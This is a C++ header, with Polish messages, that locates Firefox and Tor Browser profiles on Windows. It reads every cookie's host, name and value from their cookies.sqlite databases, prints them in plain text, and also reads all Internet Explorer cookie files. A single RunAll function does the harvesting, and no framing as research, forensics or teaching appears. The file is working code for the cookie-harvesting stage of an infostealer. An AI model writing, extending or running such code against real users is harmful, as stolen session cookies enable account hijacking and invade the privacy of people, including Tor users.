#ifndef GECKO_AND_IE_COOKIES_H
#define GECKO_AND_IE_COOKIES_H

#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include "sqlite3.h"

namespace GeckoAndIECookies {

    inline std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return {};
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, result.data(), size, nullptr, nullptr);
        return result;
    }

    inline std::wstring GetRoamingAppData() {
        wchar_t* path = nullptr;
        SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &path);
        std::wstring result(path);
        CoTaskMemFree(path);
        return result;
    }

    // --- FIREFOX / TOR BROWSER ---
    inline std::wstring FindFirefoxProfile(const std::wstring& profilesPath) {
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW((profilesPath + L"\\*.default*").c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            std::wstring profile = profilesPath + L"\\" + findData.cFileName;
            FindClose(hFind);
            return profile;
        }
        return L"";
    }

    inline void ReadFirefoxLikeCookies(const std::wstring& profileDir, const std::string& browserName) {
        std::wstring dbPath = profileDir + L"\\cookies.sqlite";
        std::string dbPathStr = WStringToString(dbPath);

        sqlite3* db = nullptr;
        if (sqlite3_open(dbPathStr.c_str(), &db) != SQLITE_OK) {
            std::cerr << "[" << browserName << "] Brak bazy cookies.sqlite w profilu.\n";
            return;
        }

        const char* sql = "SELECT host, name, value, path, isSecure, isHttpOnly, expiry FROM moz_cookies;";
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
            std::cerr << "[" << browserName << "] Błąd zapytania: " << sqlite3_errmsg(db) << "\n";
            sqlite3_close(db);
            return;
        }

        std::cout << "\n=== " << browserName << " (wartości jawne) ===\n";
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string host   = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
            std::string name   = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
            std::string value  = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

            std::cout << "Host: " << host << " | Name: " << name << " | Val: " << value << "\n";
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }

    // --- INTERNET EXPLORER ---
    inline void ReadIECookies() {
        std::wstring cookiesDir = GetRoamingAppData() + L"\\Microsoft\\Windows\\Cookies";
        std::string searchPath = WStringToString(cookiesDir + L"\\*.txt");

        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) {
            std::cout << "\n=== Internet Explorer ===\nBrak plików cookie (lub katalog nie istnieje).\n";
            return;
        }

        std::cout << "\n=== Internet Explorer (plain text) ===\n";
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string filePath = WStringToString(cookiesDir) + "\\" + findData.cFileName;
                std::ifstream file(filePath);
                if (file.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    std::cout << "Plik: " << findData.cFileName << " | Odczytano ciasteczko IE\n";
                    file.close();
                }
            }
        } while (FindNextFileA(hFind, &findData) != 0);
        FindClose(hFind);
    }

    inline void RunAll() {
        std::wstring roaming = GetRoamingAppData();

        // Firefox
        std::wstring firefoxProfiles = roaming + L"\\Mozilla\\Firefox\\Profiles";
        std::wstring ffProfile = FindFirefoxProfile(firefoxProfiles);
        if (!ffProfile.empty())
            ReadFirefoxLikeCookies(ffProfile, "Mozilla Firefox");

        // Tor Browser
        std::wstring torBase = roaming + L"\\Tor Browser\\Browser\\Profiles";
        std::wstring torProfile = FindFirefoxProfile(torBase);
        if (!torProfile.empty())
            ReadFirefoxLikeCookies(torProfile, "Tor Browser");

        // Internet Explorer
        ReadIECookies();
    }
}

#endif